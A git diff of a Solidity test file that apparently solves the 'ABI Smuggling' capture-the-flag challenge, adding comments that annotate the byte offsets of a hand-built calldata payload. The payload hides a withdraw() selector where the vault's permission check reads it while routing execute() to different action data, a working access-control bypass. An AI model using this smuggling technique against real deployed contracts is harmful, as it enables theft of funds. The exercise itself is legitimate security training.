@@ -91,13 +91,13 @@ contract ABISmugglingChallenge is Test {
         );
 
         bytes memory maliciousData = abi.encodePacked(
-            bytes4(0x1cff79cd),
-            bytes32(uint256(uint160(address(vault)))),
-            //@note selector(4 bytes) + 0x80 ==> 0x84
-            bytes32(uint256(0x80)),
-            bytes32(0), // padding
-            bytes4(0xd9caed12),
-            bytes28(0), // padding
+            bytes4(0x1cff79cd), // execute()                                 [4 + 3*32]
+            bytes32(uint256(uint160(address(vault)))), //target  ------ 32      
+            //@note selector(4 bytes) + 0x80 ==> 0x84                           
+            bytes32(uint256(0x80)), // Offset of actionDat       ------ 64
+            bytes32(0), // padding                               ------ 96
+            bytes4(0xd9caed12), // withdraw() selector           ------ 100         
+            bytes28(0), // padding                               ------ 128
             bytes32(realCall.length),
             realCall
         );
